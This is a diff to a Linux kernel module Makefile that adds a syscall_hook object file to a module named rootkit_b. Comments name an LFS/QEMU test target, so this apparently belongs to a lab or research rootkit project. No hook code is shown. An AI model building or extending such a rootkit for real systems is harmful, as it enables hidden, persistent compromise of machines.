@@ -4,7 +4,7 @@
 # build driven by the running kernel's build tree (see KDIR below).
 
 obj-m += rootkit_b.o
-rootkit_b-y := src/companion_dev.o src/module_core.o
+rootkit_b-y := src/companion_dev.o src/syscall_hook.o src/module_core.o
 
 # Kernel build tree of the currently running kernel. On the LFS/QEMU target
 # this must resolve to the kernel sources/headers of the booted kernel.
